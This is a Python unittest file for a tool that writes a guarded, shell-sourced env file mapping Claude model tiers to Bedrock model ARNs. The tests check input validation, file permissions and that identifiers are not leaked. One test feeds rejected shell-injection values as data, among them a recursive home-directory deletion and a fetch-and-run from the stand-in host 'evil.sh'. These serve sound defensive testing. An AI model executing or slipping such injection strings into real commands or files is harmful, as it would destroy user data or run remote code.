"""The generated file is executed by a shell, and holds identifiers that must not leak.

Those two facts drive most of what is asserted here: values that are not shaped like a
model id are refused rather than quoted, and no code path -- success, failure, or
reporting -- puts a value in its output.
"""

from __future__ import annotations

import io
import os
import re
import sys
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from tempfile import TemporaryDirectory

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import bedrock_tiers  # noqa: E402

# Shaped like the real thing, so a leak would be visible.
ARN = "arn:aws:bedrock:ap-northeast-2:123456789012:application-inference-profile/abc123"
SECRETS = (ARN, "123456789012", "ap-northeast-2", "abc123")


class TestValidate(unittest.TestCase):
    def test_accepts_model_ids_and_arns(self):
        for v in (ARN, "us.anthropic.claude-opus-4-8",
                  "anthropic.claude-haiku-4-5-20251001-v1:0", "claude-sonnet-4-6"):
            self.assertEqual(bedrock_tiers.validate("opus", v), v)

    def test_rejects_shell_metacharacters(self):
        """The file is sourced, so a value is code. These must not be written at all."""
        for v in ('$(rm -rf ~)', '`id`', 'arn"; curl evil.sh|sh; #',
                  "arn:aws:bedrock:x\nexport PATH=/tmp", "arn with space", "${HOME}"):
            with self.assertRaises(bedrock_tiers.ValueRejected):
                bedrock_tiers.validate("opus", v)

    def test_rejects_empty_and_unknown_tier(self):
        with self.assertRaises(bedrock_tiers.ValueRejected):
            bedrock_tiers.validate("opus", "")
        with self.assertRaises(bedrock_tiers.ValueRejected):
            bedrock_tiers.validate("turbo", ARN)

    def test_rejection_message_does_not_echo_the_value(self):
        """A rejected value is exactly the kind that should not reach a transcript."""
        bad = f'{ARN}"; echo pwned'
        with self.assertRaises(bedrock_tiers.ValueRejected) as ctx:
            bedrock_tiers.validate("opus", bad)
        for secret in SECRETS:
            self.assertNotIn(secret, str(ctx.exception))


class TestWrite(unittest.TestCase):
    def setUp(self):
        self._tmp = TemporaryDirectory()
        self.path = Path(self._tmp.name) / "bedrock-models.env"
        self.addCleanup(self._tmp.cleanup)

    def test_writes_guarded_exports_at_0600(self):
        bedrock_tiers.write({"opus": ARN, "sonnet": "us.anthropic.claude-sonnet-4-6"},
                            self.path)
        body = self.path.read_text()
        self.assertIn('if [ -n "$CLAUDE_CODE_USE_BEDROCK" ]; then', body)
        self.assertIn('export ANTHROPIC_DEFAULT_OPUS_MODEL="', body)
        self.assertIn('export ANTHROPIC_DEFAULT_SONNET_MODEL="', body)
        self.assertTrue(body.rstrip().endswith("fi"))
        self.assertEqual(oct(self.path.stat().st_mode & 0o777), "0o600")

    def test_guard_keeps_it_inert_off_bedrock(self):
        """The whole point of the guard: a first-party machine is unaffected."""
        bedrock_tiers.write({"opus": ARN}, self.path)
        body = self.path.read_text()
        guard_at = body.index("CLAUDE_CODE_USE_BEDROCK")
        self.assertLess(guard_at, body.index("ANTHROPIC_DEFAULT_OPUS_MODEL"))

    def test_merge_keeps_tiers_not_named_this_run(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        bedrock_tiers.write({"sonnet": "claude-sonnet-4-6"}, self.path)
        self.assertEqual(set(bedrock_tiers.read_existing(self.path)), {"opus", "sonnet"})

    def test_rewrite_is_byte_identical(self):
        """Re-running must not churn the file, or nobody will run it twice."""
        vals = {"opus": ARN, "sonnet": "claude-sonnet-4-6"}
        bedrock_tiers.write(vals, self.path)
        first = self.path.read_bytes()
        bedrock_tiers.write(vals, self.path)
        self.assertEqual(first, self.path.read_bytes())

    def test_result_reports_presence_not_values(self):
        res = bedrock_tiers.write({"opus": ARN}, self.path)
        blob = repr(res)
        for secret in SECRETS:
            self.assertNotIn(secret, blob)
        self.assertEqual(res["tiers"], ["opus"])

    def test_a_rejected_value_writes_nothing(self):
        with self.assertRaises(bedrock_tiers.ValueRejected):
            bedrock_tiers.write({"opus": '$(id)'}, self.path)
        self.assertFalse(self.path.exists())

    def test_no_temp_file_is_left_behind(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        leftovers = [p.name for p in self.path.parent.iterdir() if p.name.endswith(".tmp")]
        self.assertEqual(leftovers, [])


class TestStatus(unittest.TestCase):
    def setUp(self):
        self._tmp = TemporaryDirectory()
        self.dir = Path(self._tmp.name)
        self.path = self.dir / "bedrock-models.env"
        self.addCleanup(self._tmp.cleanup)

    def test_reports_presence_only(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        st = bedrock_tiers.status(self.path, env={"ANTHROPIC_DEFAULT_OPUS_MODEL": ARN},
                                  profiles=[])
        blob = repr(st) + "\n".join(bedrock_tiers.render_status(st))
        for secret in SECRETS:
            self.assertNotIn(secret, blob)
        self.assertTrue(st["file"]["opus"])
        self.assertTrue(st["live"]["opus"])
        self.assertFalse(st["file"]["sonnet"])

    def test_flags_a_file_no_profile_sources(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        st = bedrock_tiers.status(self.path, env={}, profiles=[])
        self.assertFalse(st["wired"])
        self.assertTrue(any("tier_file_not_sourced" in l
                            for l in bedrock_tiers.render_status(st)))

    def test_detects_the_source_line_in_a_profile(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        profile = self.dir / ".zshrc"
        profile.write_text(bedrock_tiers.shell_line(self.path) + "\n")
        st = bedrock_tiers.status(self.path, env={}, profiles=[profile])
        self.assertTrue(st["wired"])
        self.assertNotIn("tier_file_not_sourced",
                         "\n".join(bedrock_tiers.render_status(st)))

    def test_flags_widened_permissions(self):
        bedrock_tiers.write({"opus": ARN}, self.path)
        os.chmod(self.path, 0o644)
        st = bedrock_tiers.status(self.path, env={}, profiles=[])
        self.assertTrue(any("tier_file_mode" in l
                            for l in bedrock_tiers.render_status(st)))

    def test_missing_file_is_not_an_error(self):
        st = bedrock_tiers.status(self.path, env={}, profiles=[])
        self.assertFalse(st["exists"])
        self.assertEqual(bedrock_tiers.read_existing(self.path), {})


class TestCli(unittest.TestCase):
    def setUp(self):
        self._tmp = TemporaryDirectory()
        self.path = Path(self._tmp.name) / "bedrock-models.env"
        self.addCleanup(self._tmp.cleanup)

    def _run(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = bedrock_tiers.main(argv)
        return code, out.getvalue() + err.getvalue()

    def test_set_without_fix_writes_nothing(self):
        code, _ = self._run(["--set", f"opus={ARN}", "--path", str(self.path)])
        self.assertEqual(code, 1)
        self.assertFalse(self.path.exists())

    def test_fix_writes_and_prints_no_value(self):
        code, text = self._run(["--set", f"opus={ARN}", "--path", str(self.path), "--fix"])
        self.assertEqual(code, 0)
        self.assertTrue(self.path.exists())
        for secret in SECRETS:
            self.assertNotIn(secret, text)

    def test_bad_value_exits_2_without_echoing_it(self):
        code, text = self._run(
            ["--set", f'opus={ARN}"; echo pwned', "--path", str(self.path), "--fix"])
        self.assertEqual(code, 2)
        self.assertFalse(self.path.exists())
        for secret in SECRETS:
            self.assertNotIn(secret, text)

    def test_json_output_carries_no_value(self):
        self._run(["--set", f"opus={ARN}", "--path", str(self.path), "--fix"])
        code, text = self._run(["--path", str(self.path), "--json"])
        self.assertEqual(code, 0)
        for secret in SECRETS:
            self.assertNotIn(secret, text)

    def test_shell_line_uses_tilde_for_home(self):
        line = bedrock_tiers.shell_line(Path.home() / ".claude" / "bedrock-models.env")
        self.assertIn("~/.claude/bedrock-models.env", line)
        self.assertNotIn(str(Path.home()), line)


class TestGeneratedFileIsValidShell(unittest.TestCase):
    def test_bash_parses_it_and_the_guard_holds(self):
        """Sourcing it off Bedrock must export nothing; on Bedrock it must export."""
        import shutil
        import subprocess
        bash = shutil.which("bash")
        if not bash:
            self.skipTest("bash not available")
        with TemporaryDirectory() as d:
            path = Path(d) / "bedrock-models.env"
            bedrock_tiers.write({"opus": ARN}, path)

            off = subprocess.run(
                [bash, "-c", f'unset CLAUDE_CODE_USE_BEDROCK; source "{path}"; '
                             f'echo "[${{ANTHROPIC_DEFAULT_OPUS_MODEL:-}}]"'],
                capture_output=True, text=True)
            self.assertEqual(off.returncode, 0, off.stderr)
            self.assertEqual(off.stdout.strip(), "[]")

            on = subprocess.run(
                [bash, "-c", f'export CLAUDE_CODE_USE_BEDROCK=1; source "{path}"; '
                             f'echo "[${{ANTHROPIC_DEFAULT_OPUS_MODEL:-}}]"'],
                capture_output=True, text=True)
            self.assertEqual(on.returncode, 0, on.stderr)
            self.assertEqual(on.stdout.strip(), f"[{ARN}]")


if __name__ == "__main__":
    unittest.main()
